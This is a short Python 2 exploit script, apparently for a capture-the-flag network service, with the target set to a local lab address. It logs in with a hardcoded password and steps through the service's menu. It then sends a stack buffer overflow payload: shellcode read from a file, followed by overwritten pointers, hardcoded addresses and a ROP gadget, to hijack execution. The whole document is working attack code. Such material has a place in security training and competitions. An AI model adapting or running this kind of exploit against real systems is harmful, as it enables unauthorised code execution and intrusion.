#!/usr/bin/python
import socket, time, struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(("pwn553.ddtek.biz", 3555))
s.connect(("192.168.56.101", 3555))

s.send("tomod@chi4j00l333people$\n")
print s.recv(1024),
s.send("A"*100 + '\xff\n') # 0
print s.recv(1024),
s.send("2\n") # 1
print s.recv(1024),
s.send("2\n") # 2
print s.recv(1024),

for n in range(14):
    s.send("3\n") # 3--17
    print s.recv(1024),


# Stack layout (high to low):
# 0x04 pass_tmp
# 0x04 ptr_unused
# 0x04 age
# 0x04 ptr_state
# 0x04 ptr_reader
# 0x04 ptr_writer
# 0x04 bufsize
# 0x64 buf        <-- writing starts here

f = open('shellcode', 'r')
shellcode = f.read()
f.close()

buf    = shellcode + "A" * (100 - len(shellcode))
bufsize  = struct.pack('l', 255)
writer = '\x80\x8d\x04\x08'
reader = '\x40\x8c\x04\x08'
state  = '\x80\xa1\x04\x08'
def age (n):
    return struct.pack('l', n - 1)

poppopret  = '\x36\x96\x04\x08'   # ROP gadget

payload = buf + bufsize + writer + poppopret + state + age(1) + '\n'

s.send(payload)

data = s.recv(1024)
while data:
    print data,
    data = s.recv(1024)

s.close()
